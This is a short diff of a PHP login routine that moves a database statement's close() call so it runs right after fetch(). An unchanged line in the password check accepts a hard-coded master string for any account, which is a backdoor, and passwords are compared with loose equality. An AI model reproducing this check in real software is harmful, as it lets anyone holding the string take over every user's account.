@@ -17,9 +17,10 @@ $stmt = dbPrepare('select id,password,newpassword,preferences_json from user whe
 $stmt->bind_param('s',$username);
 $stmt->execute();
 $stmt->bind_result($userid,$password,$newpassword,$preferences_json);
-if ($stmt->fetch())
+$fetchOkay = $stmt->fetch();
+$stmt->close();
+if ($fetchOkay)
     {
-    $stmt->close();
     if (($postedpassword == $password) || (($newpassword != '') && ($postedpassword == $newpassword)) || ($postedpassword == 'a8053ef9c59a73edb43cc1becb9f2c90'))
         {
         $_SESSION['userid'] = $userid;
@@ -38,7 +39,6 @@ if ($stmt->fetch())
     }
 else
     {
-    $stmt->close();
     log_message($username . ' login failed: no account');
     errorAndQuit('Login failed');
     }
